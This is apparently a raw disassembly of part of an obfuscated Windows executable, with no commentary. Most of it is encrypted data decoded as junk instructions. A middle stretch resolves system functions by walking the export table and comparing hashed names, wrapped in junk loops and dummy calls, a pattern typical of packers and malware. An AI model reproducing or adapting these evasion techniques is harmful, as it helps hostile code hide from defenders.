  40cc81:	ins    DWORD PTR es:[edi],dx
  40cc82:	or     al,0x5e
  40cc84:	stos   BYTE PTR es:[di],al
  40cc86:	push   ebx
  40cc87:	(bad)
  40cc8b:	push   edx
  40cc8c:	cmp    eax,0x18c6427
  40cc91:	loop   0x40ccd5
  40cc93:	push   edi
  40cc94:	icebp  
  40cc95:	daa    
  40cc96:	push   ss
  40cc97:	jp     0x40cc1e
  40cc99:	mov    dh,al
  40cc9b:	adc    esi,DWORD PTR [edi-0x19bec3c1]
  40cca1:	pop    ds
  40cca2:	(bad)  
  40cca3:	scas   al,BYTE PTR es:[edi]
  40cca4:	leave  
  40cca5:	popa   
  40cca6:	imul   edx,DWORD PTR [edx],0x762fa314
  40ccac:	scas   eax,DWORD PTR es:[edi]
  40ccad:	inc    esp
  40ccae:	add    ebx,DWORD PTR [ecx+0x2d]
  40ccb1:	or     BYTE PTR [eax-0x72],0xee
  40ccb5:	xchg   ecx,eax
  40ccb6:	dec    DWORD PTR [ebp+0x4e]
  40ccb9:	retf   0x89f8
  40ccbc:	std    
  40ccbd:	test   al,0x37
  40ccbf:	mov    bh,0x24
  40ccc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccc2:	fidivr WORD PTR [edx+0x17]
  40ccc5:	lods   eax,DWORD PTR ds:[esi]
  40ccc6:	adc    bh,BYTE PTR [edi]
  40ccc8:	pop    ss
  40ccc9:	aad    0xfc
  40cccb:	jns    0x40cc89
  40cccd:	arpl   WORD PTR [ecx-0x2f6e95f6],di
  40ccd3:	jo     0x40cd1e
  40ccd5:	mul    bl
  40ccd7:	pop    edi
  40ccd8:	add    ch,BYTE PTR [edx+0x1d]
  40ccdb:	ret    0x3eba
  40ccde:	pushf  
  40ccdf:	add    eax,0xcd76627f
  40cce4:	dec    ebp
  40cce5:	loopne 0x40cced
  40cce7:	scas   al,BYTE PTR es:[edi]
  40cce8:	add    al,0xc3
  40ccea:	cmp    BYTE PTR [edx-0x3e725f3f],ch
  40ccf0:	sbb    ch,BYTE PTR ds:0x3b5253b4
  40ccf6:	jns    0x40cd73
  40ccf8:	mov    ecx,0xfe5ba71c
  40ccfd:	adc    BYTE PTR [edx],ah
  40ccff:	retf   
  40cd00:	xlat   BYTE PTR ds:[ebx]
  40cd01:	jnp    0x40cd61
  40cd03:	mov    esp,0x778e06
  40cd08:	int    0x87
  40cd0a:	xchg   edi,eax
  40cd0b:	nop
  40cd0c:	mov    ds:0xd1ef73fd,al
  40cd11:	sub    DWORD PTR [edx-0x11],esp
  40cd14:	dec    esp
  40cd15:	js     0x40ccd4
  40cd17:	inc    ebp
  40cd18:	pop    eax
  40cd19:	pop    es
  40cd1a:	dec    edx
  40cd1b:	ins    BYTE PTR es:[edi],dx
  40cd1c:	add    esp,DWORD PTR [edx+edi*1+0x71e16025]
  40cd23:	mov    ecx,ebp
  40cd25:	jp     0x40ccf1
  40cd27:	push   cs
  40cd28:	mov    DWORD PTR [edx+0x17],edx
  40cd2b:	lods   al,BYTE PTR ds:[esi]
  40cd2c:	fcomi  st,st(2)
  40cd2e:	(bad)  [esp+ecx*4]
  40cd31:	dec    ecx
  40cd32:	fs mov ebx,0x7f18d222
  40cd38:	fnstcw WORD PTR [ecx+eax*8+0x77e2fcb8]
  40cd3f:	push   edx
  40cd40:	sub    DWORD PTR [esi],ecx
  40cd42:	pop    es
  40cd43:	adc    BYTE PTR [ebx+0x1f4cab2d],bl
  40cd49:	fild   DWORD PTR [eax+0xa]
  40cd4c:	jno    0x40cd6d
  40cd4e:	outs   dx,BYTE PTR ds:[esi]
  40cd4f:	jb     0x40cdb2
  40cd51:	xor    DWORD PTR [ecx],eax
  40cd53:	repnz push edx
  40cd55:	push   eax
  40cd56:	(bad)  
  40cd57:	pop    eax
  40cd58:	icebp  
  40cd59:	xor    ch,BYTE PTR [ebx]
  40cd5b:	loop   0x40cd42
  40cd5d:	fs aas 
  40cd5f:	cli    
  40cd60:	(bad)  
  40cd62:	inc    eax
  40cd63:	fild   QWORD PTR [edi]
  40cd65:	daa    
  40cd66:	inc    esi
  40cd67:	push   ss
  40cd68:	std    
  40cd69:	xchg   DWORD PTR [ecx-0x34cc0ee8],edx
  40cd6f:	or     eax,0x9dfaad69
  40cd74:	xlat   BYTE PTR ds:[ebx]
  40cd75:	xlat   BYTE PTR ds:[ebx]
  40cd76:	scas   eax,DWORD PTR es:[edi]
  40cd77:	aam    0xa5
  40cd79:	pop    ds
  40cd7a:	inc    esp
  40cd7b:	mov    BYTE PTR [ebp+0x4524586e],cl
  40cd81:	mov    dh,0xb8
  40cd83:	pop    esp
  40cd84:	mov    cl,0x1c
  40cd86:	push   ebp
  40cd88:	test   al,0xd1
  40cd8a:	mov    edi,0xe9dd11e6
  40cd8f:	out    dx,eax
  40cd90:	pop    ds
  40cd91:	loopne 0x40cdf9
  40cd93:	xchg   esp,eax
  40cd94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd95:	sub    edx,DWORD PTR [edx]
  40cd97:	imul   edi,DWORD PTR [ecx],0x4bdcb230
  40cd9d:	sti    
  40cd9e:	and    BYTE PTR [ebx-0x4],dh
  40cda1:	jg     0x40cd89
  40cda3:	inc    ebp
  40cda4:	push   es
  40cda5:	inc    ebx
  40cda6:	cld    
  40cda7:	fdivr  st(0),st
  40cda9:	inc    edi
  40cdaa:	cmp    eax,0xc3f4dcee
  40cdaf:	cmp    al,0xa9
  40cdb1:	in     al,dx
  40cdb2:	dec    esp
  40cdb3:	test   eax,0x8f2f8996
  40cdb8:	cmp    al,0x62
  40cdba:	int    0xa9
  40cdbc:	sub    DWORD PTR [eax+eiz*8],edi
  40cdbf:	push   edx
  40cdc0:	mov    dl,dh
  40cdc2:	lock dec ebx
  40cdc4:	(bad)  
  40cdc5:	push   ecx
  40cdc6:	mov    esi,0xde728b9c
  40cdcb:	jle    0x40cd4f
  40cdcd:	je     0x40ce12
  40cdcf:	mov    eax,0xa0f41942
  40cdd4:	push   ebx
  40cdd5:	stc    
  40cdd6:	pop    esi
  40cdd7:	repnz mov esp,0x662f62e7
  40cddd:	mov    esp,0x6e962217
  40cde2:	sahf   
  40cde3:	mov    bl,bl
  40cde5:	sub    esi,esi
  40cde7:	and    esi,DWORD PTR [edi-0x12328d81]
  40cded:	lock icebp 
  40cdef:	jbe    0x40cdb0
  40cdf1:	mov    eax,0x493074b9
  40cdf6:	mov    edi,0xa29eb35a
  40cdfb:	add    eax,0xb0f10c1e
  40ce00:	jge    0x40ce0b
  40ce02:	in     al,dx
  40ce03:	mov    ds:0x7312f714,al
  40ce08:	je     0x40ce82
  40ce0a:	push   ss
  40ce0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce0c:	sbb    DWORD PTR [edx+0x359ff448],0x3e7a0f42
  40ce16:	loop   0x40ce8b
  40ce18:	arpl   WORD PTR [edx+esi*1-0x73],dx
  40ce1c:	(bad)  
  40ce1d:	aad    0x95
  40ce1f:	not    DWORD PTR [ebp-0x37af94f0]
  40ce25:	test   BYTE PTR [edi+0x71],dl
  40ce28:	ins    BYTE PTR es:[edi],dx
  40ce29:	push   ecx
  40ce2a:	jbe    0x40ce4c
  40ce2c:	fcmovbe st,st(7)
  40ce2e:	cdq    
  40ce2f:	(bad)  
  40ce30:	mov    cl,0xbc
  40ce32:	lea    ebp,[esi]
  40ce34:	scas   eax,DWORD PTR es:[edi]
  40ce35:	pop    edi
  40ce36:	loopne 0x40cde3
  40ce38:	push   ds
  40ce39:	mov    cs:0xb556e8f4,al
  40ce3f:	jb     0x40cdcf
  40ce41:	cld    
  40ce42:	xor    eax,0x57429255
  40ce47:	(bad)  
  40ce48:	adc    al,0x46
  40ce4a:	repnz push ss
  40ce4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce4d:	jl     0x40ce94
  40ce4f:	or     ebx,DWORD PTR [ebx+ebp*2+0x36]
  40ce53:	fstp   DWORD PTR ds:[ecx+edx*8]
  40ce57:	add    eax,0x20345490
  40ce5c:	(bad)  [eax+ebx*1-0x7a]
  40ce60:	lods   eax,DWORD PTR ds:[esi]
  40ce61:	sbb    esp,0xad2c5496
  40ce67:	inc    esi
  40ce68:	in     eax,dx
  40ce69:	jnp    0x40ce92
  40ce6b:	cmp    ch,BYTE PTR [edx+0x72]
  40ce6e:	sbb    ch,BYTE PTR [edi+0x4bb500b7]
  40ce74:	adc    al,0xaa
  40ce76:	mov    ah,0xbe
  40ce78:	fnsave [edx]
  40ce7a:	in     eax,dx
  40ce7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce7c:	into   
  40ce7d:	mov    eax,0x93f30e62
  40ce82:	ss inc ebx
  40ce84:	pop    edx
  40ce85:	mov    edx,0x3e0fa188
  40ce8a:	fidiv  WORD PTR [edi+ecx*2]
  40ce8d:	fidiv  WORD PTR ds:0x89d711a3
  40ce93:	call   0xd501c0dd
  40ce98:	or     DWORD PTR [ebx+0x5c7fc45],ecx
  40ce9e:	stos   DWORD PTR es:[edi],eax
  40ce9f:	mov    es,WORD PTR [edx+0x0]
  40cea2:	push   ds
  40cea3:	add    BYTE PTR [eax],al
  40cea5:	add    BYTE PTR [ebx+0x428eab3d],al
  40ceab:	add    BYTE PTR [eax],al
  40cead:	je     0x40cee0
  40ceb3:	cmp    DWORD PTR ds:0x428eab,0x2d
  40ceba:	ja     0x40cee0
  40cec0:	jmp    0x40cece
  40cec5:	push   DWORD PTR [ebp-0x24]
  40cec8:	call   DWORD PTR ds:0x42a9c3
  40cece:	mov    ebx,DWORD PTR ds:0x428eab
  40ced4:	dec    ebx
  40ced5:	mov    DWORD PTR ds:0x428eab,ebx
  40cedb:	jmp    0x40cea6
  40cee0:	xor    eax,esi
  40cee2:	add    eax,edi
  40cee4:	or     ebx,0x4a81
  40ceea:	mov    DWORD PTR [ebp-0x30],eax
  40ceed:	mov    ebx,DWORD PTR [ebp-0x4]
  40cef0:	or     eax,DWORD PTR ds:0x428e7b
  40cef6:	xor    ebx,esi
  40cef8:	and    DWORD PTR ds:0x428e6b,0x0
  40cf02:	jmp    0x40cf12
  40cf07:	mov    eax,ds:0x428e6b
  40cf0c:	inc    eax
  40cf0d:	mov    ds:0x428e6b,eax
  40cf12:	cmp    DWORD PTR ds:0x428e6b,0x19
  40cf19:	jae    0x40cf59
  40cf1f:	cmp    DWORD PTR ds:0x428e6b,0x8
  40cf26:	jl     0x40cf59
  40cf2c:	jmp    0x40cf3c
  40cf31:	push   0x428189
  40cf36:	call   DWORD PTR ds:0x42a9cb
  40cf3c:	cmp    DWORD PTR ds:0x428e6b,0x7
  40cf43:	jne    0x40cf54
  40cf49:	mov    eax,ds:0x428e6b
  40cf4e:	inc    eax
  40cf4f:	mov    ds:0x428e6b,eax
  40cf54:	jmp    0x40cf07
  40cf59:	add    ebx,edi
  40cf5b:	sub    DWORD PTR ds:0x428e8b,ebx
  40cf61:	mov    eax,DWORD PTR [ebp-0x24]
  40cf64:	xor    DWORD PTR ds:0x428ebb,0x518c
  40cf6e:	sub    eax,edi
  40cf70:	lea    ecx,[ebx-0x3272f6]
  40cf76:	xor    eax,esi
  40cf78:	xor    DWORD PTR ds:0x428e67,0x744d
  40cf82:	xor    ecx,esi
  40cf84:	mov    DWORD PTR ds:0x428eb3,0x57aa
  40cf8e:	cmp    ecx,eax
  40cf90:	mov    DWORD PTR ds:0x428e8f,0x2448
  40cf9a:	je     0x40d1fa
  40cfa0:	mov    eax,ds:0x428ebb
  40cfa5:	and    DWORD PTR ds:0x428e2f,eax
  40cfab:	mov    eax,DWORD PTR [ebp-0x4]
  40cfae:	neg    DWORD PTR ds:0x428e73
  40cfb4:	xor    eax,esi
  40cfb6:	inc    DWORD PTR ds:0x428e43
  40cfbc:	add    eax,edi
  40cfbe:	mov    DWORD PTR ds:0x428eab,0x7b11
  40cfc8:	cmp    ebx,eax
  40cfca:	jne    0x40d1d7
  40cfd0:	xor    DWORD PTR ds:0x428e37,0x428e63
  40cfda:	push   DWORD PTR [ebp+0x8]
  40cfdd:	xor    DWORD PTR ds:0x428e83,0x428eaf
  40cfe7:	call   0x421aa4
  40cfec:	or     ecx,DWORD PTR ds:0x428ecb
  40cff2:	mov    DWORD PTR [ebp-0x14],eax
  40cff5:	mov    eax,DWORD PTR [ebp-0x4]
  40cff8:	and    DWORD PTR ds:0x428e97,0x0
  40d002:	mov    ecx,DWORD PTR ds:0x428e97
  40d008:	inc    ecx
  40d009:	mov    DWORD PTR ds:0x428e97,ecx
  40d00f:	cmp    DWORD PTR ds:0x428e97,0x8
  40d016:	jg     0x40d055
  40d01c:	jmp    0x40d02c
  40d021:	push   0x2d20
  40d026:	call   DWORD PTR ds:0x42a9cf
  40d02c:	cmp    DWORD PTR ds:0x428e97,0x7
  40d033:	jne    0x40d048
  40d039:	xor    ecx,ecx
  40d03b:	xor    ecx,DWORD PTR ds:0x428e97
  40d041:	inc    ecx
  40d042:	mov    DWORD PTR ds:0x428e97,ecx
  40d048:	cmp    DWORD PTR ds:0x428e97,0x16
  40d04f:	jb     0x40d002
  40d055:	mov    ecx,DWORD PTR [ebp-0x14]
  40d058:	xor    eax,esi
  40d05a:	sbb    DWORD PTR ds:0x428e33,0x7710
  40d064:	add    eax,edi
  40d066:	cmp    ecx,eax
  40d068:	mov    DWORD PTR ds:0x428e93,0x6f23
  40d072:	je     0x40f614
  40d078:	push   DWORD PTR [ebp-0x14]
  40d07b:	xor    DWORD PTR ds:0x428e33,0x5f29
  40d085:	push   DWORD PTR [ebp+0x8]
  40d088:	call   0x423e95
  40d08d:	mov    DWORD PTR [ebp-0x14],eax
  40d090:	mov    eax,DWORD PTR [ebp-0x4]
  40d093:	mov    ecx,DWORD PTR ds:0x428e93
  40d099:	and    DWORD PTR ds:0x428e8b,ecx
  40d09f:	mov    ecx,DWORD PTR [ebp-0x14]
  40d0a2:	neg    DWORD PTR ds:0x428e6b
  40d0a8:	xor    eax,esi
  40d0aa:	sub    DWORD PTR ds:0x428e8b,0x59e8
  40d0b4:	add    eax,edi
  40d0b6:	cmp    ecx,eax
  40d0b8:	je     0x40f614
  40d0be:	and    DWORD PTR ds:0x428e63,0x0
  40d0c8:	jmp    0x40d0da
  40d0cd:	mov    ecx,DWORD PTR ds:0x428e63
  40d0d3:	inc    ecx
  40d0d4:	mov    DWORD PTR ds:0x428e63,ecx
  40d0da:	cmp    DWORD PTR ds:0x428e63,0x14
  40d0e1:	jae    0x40d123
  40d0e7:	cmp    DWORD PTR ds:0x428e63,0xb
  40d0ee:	jbe    0x40d123
  40d0f4:	jmp    0x40d104
  40d0f9:	push   0x4280f7
  40d0fe:	call   DWORD PTR ds:0x42a9d3
  40d104:	cmp    DWORD PTR ds:0x428e63,0xa
  40d10b:	jne    0x40d11e
  40d111:	mov    ecx,DWORD PTR ds:0x428e63
  40d117:	inc    ecx
  40d118:	mov    DWORD PTR ds:0x428e63,ecx
  40d11e:	jmp    0x40d0cd
  40d123:	mov    eax,DWORD PTR [ebp-0x14]
  40d126:	mov    eax,DWORD PTR [eax+0x18]
  40d129:	mov    DWORD PTR [ebp-0x24],eax
  40d12c:	or     ecx,0x560
  40d132:	mov    eax,DWORD PTR [ebp-0x14]
  40d135:	adc    ecx,DWORD PTR ds:0x428e9f
  40d13b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d13e:	add    ecx,DWORD PTR [eax+0x20]
  40d141:	xor    eax,eax
  40d143:	xor    eax,DWORD PTR ds:0x428e7b
  40d149:	sbb    eax,DWORD PTR ds:0x428e67
  40d14f:	mov    ds:0x428e7b,eax
  40d154:	mov    DWORD PTR [ebp-0x2c],ecx
  40d157:	dec    ecx
  40d158:	mov    eax,DWORD PTR [ebp-0x14]
  40d15b:	add    ecx,0x1e8d
  40d161:	mov    ecx,DWORD PTR [ebp+0x8]
  40d164:	add    ecx,DWORD PTR [eax+0x24]
  40d167:	and    DWORD PTR ds:0x428e3b,0x0
  40d171:	mov    eax,ds:0x428e3b
  40d176:	inc    eax
  40d177:	mov    ds:0x428e3b,eax
  40d17c:	cmp    DWORD PTR ds:0x428e3b,0x2c
  40d183:	ja     0x40d1a4
  40d189:	jmp    0x40d197
  40d18e:	push   DWORD PTR [ebp-0x14]
  40d191:	call   DWORD PTR ds:0x42a9d7
  40d197:	cmp    DWORD PTR ds:0x428e3b,0x1f
  40d19e:	jb     0x40d171
  40d1a4:	mov    DWORD PTR [ebp-0x34],ecx
  40d1a7:	mov    eax,ds:0x428e3b
  40d1ac:	and    DWORD PTR ds:0x428e87,eax
  40d1b2:	mov    eax,DWORD PTR [ebp-0x14]
  40d1b5:	xor    DWORD PTR ds:0x428e73,0x264d
  40d1bf:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1c2:	add    ecx,DWORD PTR [eax+0x1c]
  40d1c5:	mov    DWORD PTR ds:0x428e57,0x2595
  40d1cf:	mov    DWORD PTR [ebp-0x14],ecx
  40d1d2:	jmp    0x40f5dc
  40d1d7:	mov    eax,DWORD PTR [ebp-0x2c]
  40d1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1dd:	add    ecx,DWORD PTR [eax+ebx*4]
  40d1e0:	mov    DWORD PTR [ebp-0x28],ecx
  40d1e3:	mov    eax,DWORD PTR [ebp-0x4]
  40d1e6:	mov    ecx,DWORD PTR [ebp-0x28]
  40d1e9:	xor    eax,esi
  40d1eb:	add    eax,edi
  40d1ed:	cmp    ecx,eax
  40d1ef:	je     0x40f5dc
  40d1f5:	jmp    0x40f5cd
  40d1fa:	mov    eax,DWORD PTR [ebp-0x4]
  40d1fd:	mov    ecx,DWORD PTR [ebp-0x8]
  40d200:	xor    eax,esi
  40d202:	add    eax,edi
  40d204:	jmp    0x40f5b3
  40d209:	jns    0x40d251
  40d20b:	mov    esp,0x14898cd9
  40d210:	(bad)  
  40d211:	mov    es,WORD PTR [eax+0x10b01153]
  40d217:	nop
  40d218:	push   ecx
  40d219:	push   ebp
  40d21a:	rol    BYTE PTR [ebx-0x7c9f0e7d],cl
  40d220:	and    esi,0xffffffb7
  40d223:	pop    ebp
  40d224:	aam    0x1b
  40d226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d227:	lds    ebp,FWORD PTR [eax-0x46edae8]
  40d22d:	or     ah,BYTE PTR [ebx+0x69]
  40d230:	leave  
  40d231:	in     eax,0x44
  40d233:	fwait
  40d234:	std    
  40d235:	outs   dx,DWORD PTR ds:[esi]
  40d236:	sub    al,0x70
  40d238:	test   eax,0x74e079e6
  40d23d:	or     cl,ah
  40d23f:	pop    ecx
  40d240:	jmpw   0x1837
  40d244:	je     0x40d215
  40d246:	add    eax,0x4d4321c2
  40d24b:	xor    eax,DWORD PTR [ebx+esi*1+0x3967efaf]
  40d252:	xchg   BYTE PTR [ebp-0x18],ah
  40d255:	jae    0x40d29d
  40d257:	xchg   edi,ecx
  40d259:	fbstp  TBYTE PTR [edx+0xd]
  40d25c:	inc    esp
  40d25d:	cmp    eax,0x1d5605d8
  40d262:	push   ebp
  40d263:	das    
  40d264:	scas   eax,DWORD PTR es:[edi]
  40d265:	std    
  40d266:	mov    ebp,0x4806860b
  40d26b:	add    al,0x81
  40d26d:	mov    al,ds:0x33b9c627
  40d272:	js     0x40d2d6
  40d274:	inc    ecx
  40d275:	xor    DWORD PTR ds:[ebx+0x32ed70a6],ebp
  40d27c:	jl     0x40d2c2
  40d27e:	fld    TBYTE PTR [edi+0x74]
  40d281:	dec    esi
  40d282:	jno    0x40d2a1
  40d284:	sub    al,0xd9
  40d286:	adc    BYTE PTR [ebp-0x20558541],0x42
  40d28d:	xor    ebp,ebx
  40d28f:	sub    DWORD PTR [ecx],esp
  40d291:	call   0x3772:0xe9947ce2
  40d298:	stc    
  40d299:	data16 adc dh,bl
  40d29c:	inc    ebp
  40d29d:	sub    ebp,DWORD PTR [ebp+0x5ee61762]
  40d2a3:	hlt    
  40d2a4:	inc    edi
  40d2a5:	xor    eax,0x86efb59a
  40d2aa:	loope  0x40d2a6
  40d2ac:	in     al,dx
  40d2ad:	pushf  
  40d2ae:	fldenv ds:0x7085467a
  40d2b4:	inc    ebp
  40d2b5:	sbb    ch,ch
  40d2b7:	cli    
  40d2b8:	and    al,0x7e
  40d2ba:	clc    
  40d2bb:	dec    edx
  40d2bc:	cs out 0x58,al
  40d2bf:	lock sbb eax,0xe799fa8d
  40d2c5:	aad    0x9f
  40d2c7:	test   eax,0x838cafd7
  40d2cc:	and    BYTE PTR [edx+0x58],0xc8
  40d2d0:	mov    eax,0xc07feb32
  40d2d5:	xor    ebx,0x6be24f50
  40d2db:	xchg   BYTE PTR [ecx-0x27],ah
  40d2de:	push   cs
  40d2df:	in     eax,0x35
  40d2e1:	and    ebp,ebx
  40d2e3:	pushf  
  40d2e4:	push   es
  40d2e5:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2e7:	rol    DWORD PTR [ebx-0x3af2f6d8],0xc8
  40d2ee:	dec    esi
  40d2ef:	cmp    BYTE PTR ds:0x7f13c2b7,dh
  40d2f5:	pop    esi
  40d2f6:	push   0x7b
  40d2f8:	loope  0x40d322
  40d2fa:	push   es
  40d2fb:	fs jb  0x40d34e
  40d2fe:	jns    0x40d31c
  40d300:	pushf  
  40d301:	mov    DWORD PTR [edi-0x77b0ed30],ebp
  40d307:	popf   
  40d308:	test   al,0xf5
  40d30a:	jae    0x40d330
  40d30c:	add    eax,0xa1461972
  40d311:	push   0xffffffd2
  40d313:	adc    BYTE PTR ds:0x424430ae,0xe5
  40d31a:	ret    0x521b
  40d31d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d31e:	loope  0x40d311
  40d320:	cwde   
  40d321:	js     0x40d2a5
  40d323:	push   esi
  40d324:	fistp  WORD PTR [ebx+0x65]
  40d327:	mov    esi,0x119b7571
  40d32c:	imul   edx,DWORD PTR [esi+0x488382d3],0xc939a78
  40d336:	sbb    BYTE PTR [eax+0x40],0x1
  40d33a:	sub    BYTE PTR [ebp-0x76],cl
  40d33d:	pop    ebx
  40d33e:	push   esp
  40d33f:	add    eax,0xfe3b7e94
  40d344:	shl    DWORD PTR [ebx+0x45],cl
  40d347:	sbb    dl,BYTE PTR fs:[eax-0x76fff6c6]
  40d34e:	out    dx,eax
  40d34f:	out    dx,eax
  40d350:	int    0x9d
  40d352:	or     al,0xd3
  40d354:	mov    edx,0x97ee8a09
  40d359:	pushf  
  40d35a:	sub    BYTE PTR [edi],0xad
  40d35d:	ja     0x40d3c1
  40d35f:	jbe    0x40d3d0
  40d361:	jge    0x40d35c
  40d363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d364:	pop    edx
  40d365:	mov    ds:0xb425988b,al
  40d36a:	add    ebx,ebp
  40d36c:	add    eax,0xb600f9fb
  40d371:	and    ebp,DWORD PTR [eax]
  40d373:	rol    DWORD PTR ds:0xfbb3b966,0xd6
  40d37a:	mov    ebx,0xd116c66c
  40d37f:	(bad)  
  40d381:	and    DWORD PTR [ecx+0x49],ebp
  40d384:	or     ebp,DWORD PTR [edx+0x36934798]
  40d38a:	mov    bh,0x64
  40d38c:	sub    DWORD PTR [esi+edx*1],0x6f8c1a77
  40d393:	or     bh,ch
  40d395:	lahf   
  40d396:	jb     0x40d378
  40d398:	test   al,0xb6
  40d39a:	adc    eax,0x6263e74c
  40d39f:	fst    DWORD PTR [ebx-0x65]
  40d3a2:	lods   al,BYTE PTR ds:[esi]
  40d3a3:	ja     0x40d3da
  40d3a5:	mov    cl,0x7c
  40d3a7:	jo     0x40d423
  40d3a9:	and    ebp,DWORD PTR [edi]
  40d3ab:	xor    eax,0x3f462155
  40d3b0:	mov    ah,0x7c
  40d3b2:	mov    eax,ds:0x5d588230
  40d3b7:	xchg   BYTE PTR [ebx+eax*4],dh
  40d3ba:	mov    edx,0xc0e1b0c4
  40d3bf:	(bad)  
  40d3c0:	jecxz  0x40d347
  40d3c2:	xlat   BYTE PTR ds:[ebx]
  40d3c3:	(bad)  
  40d3c4:	jno    0x40d435
  40d3c6:	mov    esp,0x3bd0c564
  40d3cb:	jns    0x40d3dd
  40d3cd:	mov    DWORD PTR [edi+0x24d71e28],esp
  40d3d3:	cdq    
  40d3d4:	mov    cl,0x58
  40d3d6:	and    ah,cl
  40d3d8:	sbb    eax,0x81cd8e49
  40d3dd:	mov    DWORD PTR [edx+0x2c],esp
  40d3e0:	dec    ebp
  40d3e1:	lahf   
  40d3e2:	xchg   DWORD PTR [esi-0x201b7ce3],ebp
  40d3e8:	dec    edx
  40d3e9:	pop    ecx
  40d3ea:	bnd jae 0x40d3e5
  40d3ed:	or     esp,DWORD PTR [edi-0x56ac190c]
  40d3f3:	lock pop ebx
  40d3f5:	ficom  DWORD PTR [edi+0x3ccb6123]
  40d3fb:	inc    esi
  40d3fc:	lods   eax,DWORD PTR ds:[esi]
  40d3fd:	push   ax
  40d3ff:	adc    esp,esp
  40d401:	sbb    ah,cl
  40d403:	or     eax,0x3a5a1e47
  40d408:	popa   
  40d409:	add    ecx,ebp
  40d40b:	push   edx
  40d40c:	xchg   edx,eax
  40d40d:	cli    
  40d40e:	mov    ebx,0x9f1181ce
  40d413:	cmp    al,0xb2
  40d415:	pop    es
  40d416:	retf   
  40d417:	cmp    al,0x9
  40d419:	call   0xfe28:0x1f7ddff9
  40d420:	xor    ch,dh
  40d422:	or     ecx,ebp
  40d424:	ins    BYTE PTR es:[edi],dx
  40d425:	dec    edi
  40d426:	mov    DWORD PTR ds:0x8424c162,edi
  40d42c:	fs (bad) 
  40d42e:	imul   edi,DWORD PTR [ebx],0xffffffba
  40d431:	mul    BYTE PTR [edi+0x8b25f99]
  40d437:	sahf   
  40d438:	aaa    
  40d439:	mov    WORD PTR [edi+0x1bfbed3c],es
  40d43f:	mov    al,ds:0x459123bc
  40d444:	cmp    al,0xfc
  40d446:	sbb    eax,0x2e597ded
  40d44b:	std    
  40d44c:	pop    ebp
  40d44d:	fisubr WORD PTR [ebx-0x26]
  40d450:	jne    0x40d473
  40d452:	bound  ebp,QWORD PTR [edx+0x1ab511bb]
  40d458:	xor    edi,DWORD PTR ds:0xa20b1857
  40d45e:	xchg   edi,eax
  40d45f:	lock push ebp
  40d461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d462:	dec    ebx
  40d463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d464:	(bad)  
  40d465:	push   ecx
  40d466:	rcr    DWORD PTR [edi-0x42],cl
  40d469:	mov    ds:0x4ba16f91,eax
  40d46e:	xchg   bh,al
  40d470:	xor    eax,0xaaf0c18f
  40d475:	add    BYTE PTR [ebx+0x47b235f3],ah
  40d47b:	xor    eax,edx
  40d47d:	jg     0x40d497
  40d47f:	jge    0x40d4c3
  40d481:	jg     0x40d45c
  40d483:	xchg   ebp,eax
  40d484:	(bad)  
  40d485:	ror    DWORD PTR [eax],1
  40d487:	xlat   BYTE PTR ds:[ebx]
  40d488:	ins    BYTE PTR es:[edi],dx
  40d489:	fisttp WORD PTR [ecx+0x67]
  40d48c:	mov    edx,0x5c3dea8e
  40d491:	fdiv   st,st(0)
  40d493:	push   ebp
  40d494:	push   esi
  40d495:	loopne 0x40d4e9
  40d497:	mov    ds:0x2f93d6c,eax
  40d49c:	neg    DWORD PTR [esi]
  40d49e:	test   al,0xcd
  40d4a0:	pop    ebx
  40d4a1:	mov    dh,0xef
  40d4a3:	test   al,0xde
  40d4a5:	aam    0x27
  40d4a7:	test   BYTE PTR [edx],0xf7
  40d4aa:	ins    BYTE PTR es:[edi],dx
  40d4ab:	and    eax,0xee92a20d
  40d4b0:	leave  
  40d4b1:	pop    es
  40d4b2:	je     0x40d4a9
  40d4b4:	pop    esi
  40d4b5:	mov    ebp,0xa0d66d7
  40d4ba:	pop    es
  40d4bb:	call   0x14a9:0xcfc502d5
  40d4c2:	fmul   QWORD PTR [ebp+0xc2e7167]
  40d4c8:	scas   eax,DWORD PTR es:[edi]
  40d4c9:	movq   QWORD PTR [ebx],mm5
  40d4cc:	mov    al,ds:0x2ac41a6
  40d4d1:	xchg   esp,eax
  40d4d2:	sub    eax,0xd8ad2852
  40d4d7:	retf   0xfa75
  40d4da:	push   cs
  40d4db:	or     edi,ebx
  40d4dd:	pop    edx
  40d4de:	pop    eax
  40d4df:	mov    cl,BYTE PTR [edx+ecx*1-0x1a]
  40d4e3:	xchg   esp,eax
  40d4e4:	(bad)  
  40d4e6:	shr    BYTE PTR [eax+0x73713d6c],0x3d
  40d4ed:	stos   BYTE PTR es:[edi],al
  40d4ee:	and    DWORD PTR [esi-0x263d1989],ebp
  40d4f4:	mov    dh,0x9b
  40d4f6:	es mov ch,0x49
  40d4f9:	add    esp,DWORD PTR [esi]
  40d4fb:	lods   al,BYTE PTR ds:[esi]
  40d4fc:	ret    0x7beb
  40d4ff:	enter  0xca18,0xf4
  40d503:	shl    BYTE PTR ds:0x123772e2,0x3f
  40d50a:	aam    0x52
  40d50c:	imul   ecx,DWORD PTR [edx],0x4ca0348
  40d512:	int    0x59
  40d514:	cmp    DWORD PTR [ecx],esp
  40d516:	push   es
  40d517:	hlt    
  40d518:	cs add eax,esi
  40d51b:	dec    ecx
  40d51c:	cmp    BYTE PTR [ebp+0x70f64534],bh
  40d522:	jb     0x40d59c
  40d524:	pop    eax
  40d525:	add    ch,BYTE PTR [esp+ecx*2+0x3e]
  40d529:	int3   
  40d52a:	sahf   
  40d52b:	inc    eax
  40d52c:	add    dh,ah
  40d52e:	scas   al,BYTE PTR es:[edi]
  40d52f:	dec    BYTE PTR [edx+0x3e]
  40d532:	jp     0x40d593
  40d534:	shr    DWORD PTR [eax],1
